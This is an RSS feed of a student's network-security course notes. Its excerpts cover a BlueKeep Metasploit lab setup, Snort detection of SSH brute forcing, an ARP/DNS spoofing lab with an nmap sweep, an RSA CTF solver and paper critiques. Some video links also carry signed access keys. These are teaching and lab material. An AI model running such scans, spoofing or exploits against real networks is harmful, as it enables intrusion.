<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/index.xml" rel="self" type="application/rss+xml"/><item><title>A&amp;D of Network Security - Lab 12</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-12/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-12/</guid><description>&lt;h1 id="ad-of-network-security---lab-12">
 A&amp;amp;D of Network Security - Lab 12
 &lt;a class="anchor" href="#ad-of-network-security---lab-12">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="video">
 Video
 &lt;a class="anchor" href="#video">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://files-1.dlc.ntu.edu.tw/cool-video/202305/c6cc49a9-e1f9-4a9e-a7dc-70c4f79c98b1/transcoded.mp4?AWSAccessKeyId=C6ueMrUe5JyPkWQJAyKp&amp;amp;Expires=1684429335&amp;amp;Signature=UQaLvueX0U%2Bvs65WhFgrks9vg%2Fc%3D">NTU PADNS Lecture 12&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-170">What is _mbscmp?&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">int _mbscmp(
 const unsigned char *string1,
 const unsigned char *string2
);
&lt;/code>&lt;/pre>&lt;p>Return Value&lt;/p>
&lt;blockquote>
&lt;p>&amp;lt;0 	string1 is less than string2
=0 	string1 is identical to string2
&amp;gt;0 	string1 is greater than string2&lt;/p>&lt;/blockquote>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;h3 id="static---ida-pro">
 Static - IDA Pro
 &lt;a class="anchor" href="#static---ida-pro">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler Main Source Code&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 13</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-13/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-13/</guid><description>&lt;h1 id="ad-of-network-security---lab-13">
 A&amp;amp;D of Network Security - Lab 13
 &lt;a class="anchor" href="#ad-of-network-security---lab-13">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="metasploit-with-bluekeep-vulnerability-cve-2019-0708">
 Metasploit with Bluekeep Vulnerability (CVE-2019-0708)
 &lt;a class="anchor" href="#metasploit-with-bluekeep-vulnerability-cve-2019-0708">#&lt;/a>
&lt;/h2>
&lt;h3 id="setting-up-environment">
 Setting up environment
 &lt;a class="anchor" href="#setting-up-environment">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Open Windows 7 and Kali-Linux with &lt;code>localhost only&lt;/code> mode
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/Skg3sJ93Hh.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ByyTJqnHh.png" alt="" />
:::&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Then we can note that the IP of these two machines are different:
:::spoiler Screenshot
&lt;img src="https://hackmd.io/_uploads/H1gOg5hSn.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/H1VSlcnB3.png" alt="" />
:::
Now, we know &lt;code>Win7&lt;/code>&amp;rsquo;s IP: &lt;code>192.168.56.101&lt;/code>
Kali-Linux&amp;rsquo;s IP: &lt;code>192.168.56.102&lt;/code>&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 14</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-14/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-14/</guid><description>&lt;h1 id="ad-of-network-security---lab-14">
 A&amp;amp;D of Network Security - Lab 14
 &lt;a class="anchor" href="#ad-of-network-security---lab-14">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="video">
 Video
 &lt;a class="anchor" href="#video">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://files-1.dlc.ntu.edu.tw/cool-video/202305/f4f0b276-7211-448a-812b-89b3d194ccde/transcoded.mp4?AWSAccessKeyId=C6ueMrUe5JyPkWQJAyKp&amp;amp;Expires=1685444669&amp;amp;Signature=XXKzQ0FHD31E%2FdKWhlcyX%2BcLQXg%3D">Class Description&lt;/a>
&lt;a href="https://files-1.dlc.ntu.edu.tw/cool-video/202305/b494d4d3-0d67-4672-95ab-37a8c35b70b3/transcoded.mp4?AWSAccessKeyId=C6ueMrUe5JyPkWQJAyKp&amp;amp;Expires=1685432006&amp;amp;Signature=sJvf4b%2BWXnkZY3dCFmX4vHCcyy0%3D">Lab Implementation&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>snort Rule
:::spoiler Rule Screenshot
&lt;ul>
&lt;li>Format
&lt;img src="https://hackmd.io/_uploads/S1pKEV7Ln.png" alt="" />&lt;/li>
&lt;li>Action
&lt;img src="https://hackmd.io/_uploads/HygsNEXI2.png" alt="" />&lt;/li>
&lt;li>Option
&lt;img src="https://hackmd.io/_uploads/By83VNQUh.png" alt="" />&lt;/li>
&lt;li>Option - Payload
&lt;img src="https://hackmd.io/_uploads/rJ6p44QI2.png" alt="" />
:::&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="lab-1-packet-sniffer-mode-show出-sniff-icmp封包的結果">
 Lab 1: Packet sniffer Mode show出 sniff ICMP封包的結果
 &lt;a class="anchor" href="#lab-1-packet-sniffer-mode-show%e5%87%ba-sniff-icmp%e5%b0%81%e5%8c%85%e7%9a%84%e7%b5%90%e6%9e%9c">#&lt;/a>
&lt;/h3>
&lt;p>Payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo snort -vd -i eth0 -q
&lt;/code>&lt;/pre>&lt;p>:::spoiler Result Screenshot
&lt;img src="https://hackmd.io/_uploads/BJVrHN78h.png" alt="" />
:::&lt;/p>
&lt;hr>
&lt;h3 id="lab-2-attacker-ssh爆破攻擊利用-snort偵測攻擊行為是否發生show出偵測結果-並說明snort-rule">
 Lab 2: Attacker SSH爆破攻擊，利用 Snort偵測攻擊行為是否發生，show出偵測結果 ，並說明snort rule
 &lt;a class="anchor" href="#lab-2-attacker-ssh%e7%88%86%e7%a0%b4%e6%94%bb%e6%93%8a%e5%88%a9%e7%94%a8-snort%e5%81%b5%e6%b8%ac%e6%94%bb%e6%93%8a%e8%a1%8c%e7%82%ba%e6%98%af%e5%90%a6%e7%99%bc%e7%94%9fshow%e5%87%ba%e5%81%b5%e6%b8%ac%e7%b5%90%e6%9e%9c-%e4%b8%a6%e8%aa%aa%e6%98%8esnort-rule">#&lt;/a>
&lt;/h3>
&lt;h4 id="threat-model">
 Threat Model
 &lt;a class="anchor" href="#threat-model">#&lt;/a>
&lt;/h4>
&lt;p>&lt;img src="https://hackmd.io/_uploads/SkDltNQU3.png" alt="" />&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-2/</guid><description>&lt;h1 id="ad-of-network-security---lab-2">
 A&amp;amp;D of Network Security - Lab 2
 &lt;a class="anchor" href="#ad-of-network-security---lab-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="lab-cheat-sheetcisco-packet-tracer">
 Lab Cheat Sheet(Cisco Packet Tracer)
 &lt;a class="anchor" href="#lab-cheat-sheetcisco-packet-tracer">#&lt;/a>
&lt;/h2>
&lt;h3 id="setting-vlan">
 Setting VLAN
 &lt;a class="anchor" href="#setting-vlan">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler Switch&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">Switch&amp;gt;enable
Switch#configure 
Configuring from terminal, memory, or network [terminal]? 
Enter configuration commands, one per line. End with CNTL/Z.
Switch(config)#vlan 10
Switch(config-vlan)#name green
Switch(config-vlan)#vlan 20
Switch(config-vlan)#name yellow
Switch(config-vlan)#
Switch#
%SYS-5-CONFIG_I: Configured from console by console

Switch#show vlan

VLAN Name Status Ports
---- -------------------------------- --------- -------------------------------
1 default active Fa0/5, Fa0/6, Fa0/7, Fa0/8
 Fa0/9, Fa0/10, Fa0/11, Fa0/12
 Fa0/13, Fa0/14, Fa0/15, Fa0/16
 Fa0/17, Fa0/18, Fa0/19, Fa0/20
 Fa0/21, Fa0/22, Fa0/23, Fa0/24
 Gig0/1, Gig0/2
10 green active
20 yellow active
...
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler Switch相對應的Interface&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-3/</guid><description>&lt;h1 id="ad-of-network-security---lab-3">
 A&amp;amp;D of Network Security - Lab 3
 &lt;a class="anchor" href="#ad-of-network-security---lab-3">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Network setting type in virtual box
&lt;img src="https://i.imgur.com/g2J83Xg.png" alt="" />&lt;/p>
&lt;h2 id="ping-two-machine-in-internal-mode">
 Ping two machine in internal mode
 &lt;a class="anchor" href="#ping-two-machine-in-internal-mode">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Detailed Process&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Clone another VM
&lt;img src="https://i.imgur.com/vsI7lWa.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Setting Network Configuration
&lt;img src="https://i.imgur.com/OqZ9Owm.png" alt="" />
Setting 2 VMs&amp;rsquo; network config as above.
&lt;strong>Note that&lt;/strong>, must check MAC address is different, promiscuous mode is &lt;code>Allow All&lt;/code> and the adapter is the same.&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 4(ARP &amp; DNS SPOOFING)</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/</guid><description>&lt;h1 id="ad-of-network-security---lab-4arp--dns-spoofing">
 A&amp;amp;D of Network Security - Lab 4(ARP &amp;amp; DNS SPOOFING)
 &lt;a class="anchor" href="#ad-of-network-security---lab-4arp--dns-spoofing">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ha4w30V2cLM?si=eK2wwkqROck5n3SY&amp;amp;t=4497">ARP Spoofing at &lt;code>1:15:00&lt;/code>&lt;/a>&lt;/p>
&lt;h2 id="arp-spoofing">
 ARP SPOOFING
 &lt;a class="anchor" href="#arp-spoofing">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Setting 2 VMs&amp;rsquo; network interface as Bridged adapter
:::danger
You supposed to use your own network instead of public network
:::&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Checking IP
&lt;img src="https://i.imgur.com/V1CTmtr.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/i6RUqmM.png" alt="" />
And check the victim gateway by &lt;code>nmap&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo nmap -sP 192.168.43.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 10:46 EDT
Nmap scan report for DESKTOP-D0UCTM3 (192.168.43.56)
Host is up (0.00020s latency).
MAC Address: 68:54:5A:DC:03:57 (Intel Corporate)
Nmap scan report for 192.168.43.66
Host is up (0.010s latency).
MAC Address: D4:38:9C:87:2F:C6 (Sony)
Nmap scan report for kali (192.168.43.222)
Host is up (0.00040s latency).
MAC Address: 08:00:27:B1:9D:67 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.43.78
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.13 seconds
&lt;/code>&lt;/pre>&lt;p>:::info
Victim VM $\to$ &lt;code>192.168.43.222&lt;/code> / MAC $\to$ &lt;code>08:00:27:F7:12:7A&lt;/code>
Attacker VM $\to$ &lt;code>192.168.43.78&lt;/code> / MAC $\to$ &lt;code>08:00:27:B1:9D:67&lt;/code>
Default Gateway $\to$ &lt;code>192.168.43.66&lt;/code>
:::&lt;/p></description></item><item><title>A&amp;D of Network Security - Lab 7</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security---lab-7/</guid><description>&lt;h1 id="ad-of-network-security---lab-7">
 A&amp;amp;D of Network Security - Lab 7
 &lt;a class="anchor" href="#ad-of-network-security---lab-7">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://darkranger.no-ip.org/archives/v5/document/linux/foremost_recovery.htm">What is foremost and How to use it?&lt;/a>&lt;/p>
&lt;h2 id="rsa-ctf">
 RSA CTF
 &lt;a class="anchor" href="#rsa-ctf">#&lt;/a>
&lt;/h2>
&lt;h3 id="exercise---rsa">
 Exercise - RSA
 &lt;a class="anchor" href="#exercise---rsa">#&lt;/a>
&lt;/h3>
&lt;p>Given&lt;/p>
&lt;pre tabindex="0">&lt;code>p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
e = 65537
c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
&lt;/code>&lt;/pre>&lt;p>Then I can use decrypt function to fetch plaintext.
Flag(hex): &lt;code>12058e43d9e0c22559c19774&lt;/code>
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from Crypto.Util.number import long_to_bytes, inverse, bytes_to_long

p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
e = 65537
c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034

n = p * q
phi = (q-1)*(p-1)
d = inverse(e, phi)
print(long_to_bytes(pow(c,d,n)).hex())
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>A&amp;D of Network Security Note</title><link>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-padns/ad-of-network-security-note/</guid><description>&lt;h1 id="ad-of-network-security-note">
 A&amp;amp;D of Network Security Note
 &lt;a class="anchor" href="#ad-of-network-security-note">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-practicum-of-ad-of-ns-ntu">
 tags: &lt;code>Practicum of A&amp;amp;D of NS&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-practicum-of-ad-of-ns-ntu">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;a href="http://www.ess.nthu.edu.tw/p/16-1351-74716.php?Lang=zh-tw">IP / 遮罩 / 閘道 三者的關係&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>用日常生活中的例子來比喻，IP 就好比在社區中的門牌地址，如果是要找同社區(一樣遮罩範圍的)，就只要透過社區廣播喊一聲。如果找不到人，表示在社區外，就要出社區大門(閘道)去外面問&lt;/p>
&lt;p>所以遮罩設定錯誤，代表硬把兩個不同社區的給劃在一起，但是實際上遞送封包就會找不到 (明明住光復國宅結果你跟郵差說光復國宅跟孟竹國宅都在一區)&lt;/p>
&lt;p>閘道設定錯誤則是連大門都搞錯了，這樣蓮社區都出不去，自然網路也無法連線
:::&lt;/p>&lt;/blockquote>
&lt;p>:::spoiler &lt;a href="https://blog.downager.com/2013/07/03/%E7%B6%B2%E8%B7%AF-%E6%B7%BA%E8%AB%87-ARP-Address-Resolution-Protocol-%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86/">[網路] 淺談 ARP (Address Resolution Protocol) 運作原理&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>在乙太網路上，資料的傳遞必須要有實體位址 (MAC Address)，Layer 2 設備會驗證 Frame 的實體位址，不是找它的一律捨棄，但設備一開機總不可能就有所有設備的實體位址吧？所以就需要 ARP 協定來協助取得各個設備的實體位址&lt;/p>
&lt;p>ARP 是利用乙太網路的廣播功能所設計出來的位址解析協定，它的主要特性是它的位址對應關係是動態的，以查詢的方式來獲得 I P位址 (IP Address) 和實體位址 (MAC Address / Physical Address) 的對應關係。&lt;/p>
&lt;p>只要是 Layer 3 的設備都一定會有 ARP Cache，並且會在 ARP 快取內建立 ARP 表格 (ARP Table) 用來記錄 IP 位址和實體位址的對應關係。這個 Table 會依據自身的存活時間遞減而消失，以確保資料的正確性。
&lt;img src="https://i.imgur.com/Vg2RZHd.png" alt="" />&lt;/p></description></item><item><title>Cryptography and Network Security - Final Project</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/cryptography-and-network-security---final-project/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/cryptography-and-network-security---final-project/</guid><description>&lt;h1 id="cryptography-and-network-security---final-project">
 Cryptography and Network Security - Final Project
 &lt;a class="anchor" href="#cryptography-and-network-security---final-project">#&lt;/a>
&lt;/h1>
&lt;h2 id="threshold-he-description">
 Threshold HE Description
 &lt;a class="anchor" href="#threshold-he-description">#&lt;/a>
&lt;/h2>
&lt;p>With a designed scheme in place for threshold homomorphic encryption, private keys are divided into various shares among participating individuals who then work together to collaborate on computations without revealing plaintext material.&lt;/p>
&lt;p>Decryption requires collaboration from at least the minimum requirement, e.g. $(t,n)$ means there&amp;rsquo;re $n$ participate parties but need at least $t$ parties&amp;rsquo; granting to decrypt the secret just like secret sharing scheme proposed by Shamir. Threshold homomorphic&amp;rsquo;s primary objective is secure computation involving confidential information with lesser exposure or accessibility risks for single individuals - due to a shared understanding by several stakeholders.&lt;/p></description></item><item><title>Cryptography and Network Security - Regular Critique 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/</guid><description>&lt;h1 id="cryptography-and-network-security---regular-critique-2">
 Cryptography and Network Security - Regular Critique 2
 &lt;a class="anchor" href="#cryptography-and-network-security---regular-critique-2">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/TNJhiAf4TIOgpgTzEjELKA">&lt;img src="https://hackmd.io/TNJhiAf4TIOgpgTzEjELKA/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-a-key-management-scheme-for-distributed-sensor-networks">
 Reading Topic: A key-management scheme for distributed sensor networks
 &lt;a class="anchor" href="#reading-topic-a-key-management-scheme-for-distributed-sensor-networks">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="summary">
 Summary
 &lt;a class="anchor" href="#summary">#&lt;/a>
&lt;/h2>
&lt;p>Distributed Sensor Networks (DSNs) are quite different from traditional embedded system networks, such as the number of nodes. Therefore, the security of the communication between each node is crucial. However, the storage capacity and computation capability of each node is the shallow level which is not enough to handle. So, we can’t use high computing power techniques such as asymmetric cipher (RSA) to deal with it. In contrast, they decided to use a symmetric cipher system to implement it and focus the point on how to manage and keep the key safe. This paper aimed to address the number of keys that each node in DSNs has too much. For example, if the number of nodes in DSN is n, then each node has to keep n-1 shared keys for connecting. This is not a good plan to implement. Overall, they proposed a brand-new key management scheme for large-scale DSNs and attempt to find the balance between safety and efficiency. In addition, according to the simulation result, they found out the comparison is highly better than the traditional key pre-distribution scheme.&lt;/p></description></item><item><title>Cryptography and Network Security – Comparative Critique 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-1/</guid><description>&lt;h1 id="cryptography-and-network-security--comparative-critique-1">
 Cryptography and Network Security – Comparative Critique 1
 &lt;a class="anchor" href="#cryptography-and-network-security--comparative-critique-1">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/zB9SPcdEQkaaEMKlOtSAQg">&lt;img src="https://hackmd.io/zB9SPcdEQkaaEMKlOtSAQg/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-reflections-on-trusting-distributed-trust">
 Reading Topic: Reflections on trusting distributed trust
 &lt;a class="anchor" href="#reading-topic-reflections-on-trusting-distributed-trust">#&lt;/a>
&lt;/h2>
&lt;h2 id="reading-topic-reflections-on-trusting-trust">
 Reading Topic: Reflections on Trusting Trust
 &lt;a class="anchor" href="#reading-topic-reflections-on-trusting-trust">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;p>:::spoiler Background
&lt;a href="https://www.intel.com.tw/content/www/tw/zh/architecture-and-technology/software-guard-extensions.html">什麼是 Intel® SGX？&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>提供以硬體為基礎的記憶體加密功能，可在記憶體內隔離特定的應用程式碼與資料。Intel® SGX 允許將使用者層級的程式碼配置於記憶體中的隱私區域，這稱為「指定位址空間」(enclave)，其設計是為了在較高權限層級的執行程序中受到保護&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;p>&lt;a href="https://support.mozilla.org/zh-TW/kb/send-performance-data-improve-firefox">What is firefox Telemetry&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這個功能對 Mozilla 工程師來說很有幫助，它可以幫助工程師了解 Firefox 實際的運作狀況。Telemetry 會傳送使用量及體驗的資訊給 Mozilla。當您使用 Firefox 時，Telemetry 就會測量與收集與個人隱私無關的資訊，例如記憶體消耗、反應時間和各種功能的使用頻率。這些資訊會每天例行傳送給 Mozilla 利用，讓 Firefox 越來越完善。&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;p>&lt;a href="https://letsencrypt.org/zh-tw/getting-started/">Let&amp;rsquo;s Encrypt &amp;amp; ISRG&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>Let&amp;rsquo;s Encrypt 是免費、自動化和開放的憑證頒發機構，由非營利組織網路安全研究小組 (Internet Security Research Group, ISRG) 營運。&lt;/p></description></item><item><title>Cryptography and Network Security – Comparative Critique 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-2/</guid><description>&lt;h1 id="cryptography-and-network-security--comparative-critique-2">
 Cryptography and Network Security – Comparative Critique 2
 &lt;a class="anchor" href="#cryptography-and-network-security--comparative-critique-2">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/bP2EPLmtSHWEM-XnakrMkA">&lt;img src="https://hackmd.io/bP2EPLmtSHWEM-XnakrMkA/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-the-password-reset-mitm-attack">
 Reading Topic: The Password Reset MitM Attack
 &lt;a class="anchor" href="#reading-topic-the-password-reset-mitm-attack">#&lt;/a>
&lt;/h2>
&lt;h2 id="reading-topic-is-real-time-phishing-eliminated-with-fido-social-engineering-downgrade-attacks-against-fido-protocols">
 Reading Topic: Is Real-time Phishing Eliminated with FIDO? Social Engineering Downgrade Attacks against FIDO Protocols
 &lt;a class="anchor" href="#reading-topic-is-real-time-phishing-eliminated-with-fido-social-engineering-downgrade-attacks-against-fido-protocols">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.jendow.com.tw/wiki/%E9%99%8D%E7%B4%9A%E6%94%BB%E6%93%8A">Downgrade Attack&lt;/a>
&lt;a href="https://hennge.com/tw/blog/what-is-fido.html">FIDO 是什麼？&lt;/a>
&lt;a href="https://blog.csdn.net/Kangyucheng/article/details/78911934">Topic 1 Translation&lt;/a>&lt;/p>
&lt;h2 id="summary-of-paper-1">
 Summary of paper 1
 &lt;a class="anchor" href="#summary-of-paper-1">#&lt;/a>
&lt;/h2>
&lt;p>The Password Reset MitM Attack&amp;quot; paper aims to address a security vulnerability in the password reset process that allows attackers to intercept a victim&amp;rsquo;s password reset link and gain access to their account. This problem matters because attackers can compromise personal information and sensitive data. The paper presents the Password Reset Man-in-the-Middle (PRMitM) attack and proposes several defenses to mitigate the risk, including challenge-response protocols and additional authentication factors. The authors conclude that PRMitM attacks are a significant threat to online account security, and suggest implementing additional security measures and informing users of the risks to strengthen the security of their accounts.&lt;/p></description></item><item><title>Cryptography and Network Security – Comparative Critique 3</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security--comparative-critique-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 